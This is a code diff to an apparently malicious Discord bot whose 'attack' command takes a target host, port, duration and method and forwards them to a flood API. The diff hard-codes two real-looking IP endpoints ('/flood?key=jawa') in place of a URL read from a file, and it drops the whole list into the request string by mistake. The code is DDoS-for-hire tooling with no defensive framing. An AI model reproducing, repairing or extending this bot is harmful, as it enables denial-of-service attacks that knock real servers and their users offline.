@@ -109,11 +109,14 @@ async def attack(ctx, host: str, port: int, attack_time: int, method: str):
     if ctx.channel.id != 1050334089749725195:
         await ctx.send("Please use the command in the correct channel.")
         return
-    
-    with open('api_url.txt', 'r') as f:
-        api = f.read().strip()
 
-    api_url = f'{api}&target={host}&port={port}&time={attack_time}&method={method}'
+    api_urls = [
+    "http://95.111.202.45/flood?key=jawa",
+    "http://95.111.203.212/flood?key=jawa"
+]
+
+
+    api_url = f'{api_urls}&target={host}&port={port}&time={attack_time}&method={method}'
     
     if attack_time > 300:
         await ctx.send("Max Time is 300 Seconds.")
